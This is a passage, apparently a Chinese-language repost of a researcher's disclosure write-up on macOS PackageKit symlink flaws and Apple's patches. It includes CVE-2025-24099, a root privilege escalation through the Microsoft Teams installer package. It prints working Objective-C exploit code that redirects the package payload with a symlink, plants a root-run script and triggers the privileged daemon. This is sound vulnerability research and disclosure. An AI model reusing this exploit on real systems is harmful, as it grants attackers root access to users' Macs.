  
问题  
  
从第 8 个补丁我们可以看出，它使用标志调用开放O_SYMLINK|O_NOCTTY|O_NONBLOCKAPI ，而没有使用标志O_NOFOLLOW_ANY！  
  
因此，在打开之前path=/Library/Developer/SDKs/WorkflowExtensionSDK.sdk/Library，攻击者仍然能够/Library/Developer/SDKs/WorkflowExtensionSDK.sdk用符号链接替换父路径组件。  
  
该漏洞利用过程与前一个类似。  
  
第九个补丁  
  
苹果在 macOS 中再次修补了此问题15.0。  
  
如果当前服务是特权服务“system_installd”（PKSIPCurrentProcessCanModifySystemIntegrityProtectionFiles返回TRUE），则无需使用参数“-s”即可启动shove进程：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhNwKLSsiaxkgz1yvtKkdxZ9fvMQicXAhNg8Rmxe3KSPRziaSHOaZdoicm1w/640?wx_fmt=png&from=appmsg "")  
  
在shove过程中，参数“-s”表示允许符号链接（optionFlags |= 4）：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hh3VObVXtLvjo2icKWWJYmHV3b1x9zKe7QttwRatoqaYrBZe8f9ibeib9Fw/640?wx_fmt=png&from=appmsg "")  
  
那么如果没有指定参数“-s”，函数-[PKCoreShove _linkResolutionProhibitted]将返回TRUE ：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hh2GU4eBiccruKt6IDaSiaIcsRIda7gYz7dX144MDU6Nlwyk1cJsez5v1Q/640?wx_fmt=png&from=appmsg "")  
  
接下来，如果链接解析被禁止，open API 将使用标志“O_NOFOLLOW_ANY”：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hhgj5Ficibt9Gpia5QiaPxYD5dvxs5icx4FUXoSeu3MhN5DjZwC636QrCCBIQ/640?wx_fmt=png&from=appmsg "")  
  
同时renameAPI改为，若禁止链接解析则会使用renamex_npflag “RENAME_NOFOLLOW_ANY”：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhT2ruOO61lre6pEzAlkrlWRZ2lvEFz0P4XNnVExCa5UVgktCoj4ZzAA/640?wx_fmt=png&from=appmsg "")  
  
CVE-2025-24099：LPE 的另一个变体  
现在一切看起来都很好，但是第三方开发人员签名的 PKG 文件怎么样？  
  
事实上，这是一个变体漏洞，在安装普通的第三方签名软件包时可被利用来获得root权限提升。  
  
问题（例如 Teams_osx.pkg）  
  
让我们以 Microsoft Teams 安装程序包（Teams_osx.pkg）为例。  
  
乍一看，问题存在于postinstall脚本中：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhPV33rl7KuLN6sHee3oElqBhHofpAsv7CfccglElWmzfU2f5AtqG4gw/640?wx_fmt=png&from=appmsg "")  
  
它使用“ ”注册了一个具有root权限的启动守护进程。开发人员认为，PKG安装后，应用程序路径应该归root所有，普通用户不能修改。${UPDATER_DAEMON_FILE_IN_APP}  
  
然而，通过创建符号链接可以打破这个错误的假设！  
  
攻击者可以先将root拥有的PKG Payload内容重定向到其他位置，然后${UPDATER_DAEMON_FILE_IN_APP}直接在路径“ ”处写入payload，以获取root权限。  
  
漏洞利用和演示（针对 Teams_osx.pkg）  
  
漏洞利用代码如下：  
  
```
#define TEAMS_APP_FOLDER "/Applications/Microsoft Teams classic.app"#define XPC_FOLDER TEAMS_APP_FOLDER"/Contents/TeamsUpdaterDaemon.xpc/Contents/MacOS"#define XPC_EXE_PATH XPC_FOLDER"/TeamsUpdaterDaemon"void exploit_teams_pkg(void) {    mkdir("/Applications/1337.app", 0777);    symlink("/Applications/1337.app", TEAMS_APP_FOLDER);    printf("[*] Waiting for Microsoft Teams classic installation...\npress enter when the installation is done.");    getchar();        unlink(TEAMS_APP_FOLDER);    system("mkdir -p \""XPC_FOLDER"\"");    printf("[*] Writing my LPE payload\n");    [@"#!/bin/sh\ntouch /Library/LPE\n/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal\n" writeToFile:@XPC_EXE_PATH atomically:TRUE encoding:NSUTF8StringEncoding error:nil];    chmod(XPC_EXE_PATH, 0777);}@protocolDUMMY- (void)ping;@endvoid wakeup_daemon_xpc(void) {    NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"com.microsoft.teams.TeamsUpdaterDaemon" options:NSXPCConnectionPrivileged];    connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(DUMMY)];    [connection resume];    [connection.remoteObjectProxy ping];    printf("[*] All done, enjoy the root shell :p\n");}
```  
  
  
演示视频：https://youtu.be/8h0N_n_XNQo  
  
谁应该受到指责？  
  
我首先通过 MSRC 门户向 Microsoft 报告了此问题。但他们认为这不是一个漏洞：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhyZI8iaywiaMFzlakzjykQDQRYPnBXDfsicwCcVlaDpibJud0Iibkj6jZbxQ/640?wx_fmt=png&from=appmsg "")  
  
在公开披露这个 0-day 漏洞之前，我决定向 Apple 报告这个问题。由于我报告过很多PKCoreShove逻辑中的 SIP 绕过问题，现在我对这个问题有了更好的了解。我认为这个问题的根本原因应该归咎于 Apple，只有 Apple 才能彻底解决此类问题：  
  
当我们安装Apple 签名的 PKG文件时，Apple 会仔细检查目标路径，以避免SIP 绕过问题。如果目标路径是符号链接且不受信任，则在推送 PKG 内容之前不会遵循符号链接。  
  
现在，我们正在安装一个由第三方开发人员签名的通用 PKG 文件。Apple在推送之前不再检查目标路径，这导致了此处的LPE 问题。通过创建符号链接，攻击者可以将 root 拥有的 PKG 有效负载内容重定向到任意位置。  
  
补丁  
  
macOS 15.0 中有补丁吗？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhFdJtk9xvYricsDLgx4NibgEzMtvw6om3fGD37J7aiceIMNVHtiaucv6fxQ/640?wx_fmt=png&from=appmsg "")  
  
  
苹果公司告诉我，这个问题已经在 macOS Sequoia 15.0 中得到解决，我的信用信息可以在他们的附加认可中找到。  
  
然而，通过我的测试，我仍然可以直接再次利用它，而无需更改我的代码。  
  
当我准备在OBTS上披露这个 0day 漏洞时，苹果承认了他们的错误：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhmEY4D7HXuLwlKicWDuQo1aCdFpcbzE8z6Dzic69Cb2z46tu2uB7ZnQVw/640?wx_fmt=png&from=appmsg "")  
  
macOS 15.3 中的补丁  
  
在函数中-[PKShoveInstallOperation _shoveExtractedRootOntoDestinationReturningError:]：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04HhHyRDs4LpAbPJtyXTLQxFchgZ5iazzVzgJHSF6wJamcd7reJNE8s7PBg/640?wx_fmt=png&from=appmsg "")  
  
它枚举 PKG Payload 中的所有 bundle 组件，并将父 bundle组件标记为ATOMIC_REPLACEMENT_PATH，需要以原子方式推送。shove命令将像这样生成：  
  
```
shove -f -s -O /Library/InstallerSandboxes/.PKInstallSandboxManager/EEE6ABF9-A22A-4502-9FC6-F10C0A567B18.activeSandbox/ShoveExtraOptions-7ACF2D9C-6589-4679-9850-C8ECB05111FA.plist /Library/InstallerSandboxes/.PKInstallSandboxManager/EEE6ABF9-A22A-4502-9FC6-F10C0A567B18.activeSandbox/Root /
```  
  
  
内容ShoveExtraOptions-7ACF2D9C-6589-4679-9850-C8ECB05111FA.plist：  
  
```
{  "ATOMIC_REPLACEMENT_PATHS" => [    0 => "Applications/Microsoft Teams classic.app"  ]}
```  
  
  
接下来，在函数中-[PKCoreShove shoveOneLevel:dest:]  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taf3dEZNgOrV7tzoG12W04Hhf5icbtUb8nkyxAc10bictDedJ5NggGgbpaPekE9zxs2JMZTrO6gdfr7Q/640?wx_fmt=png&from=appmsg "")  
  
它不会遵循原子替换路径的目标符号链接。  
  
总结  
PackageKit 框架中的攻击面  
- 一次难忘的漏洞搜寻之旅（补丁和绕过方法：）  
  
- 漏洞利用也已公开：https://github.com/jhftss/POC  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
  
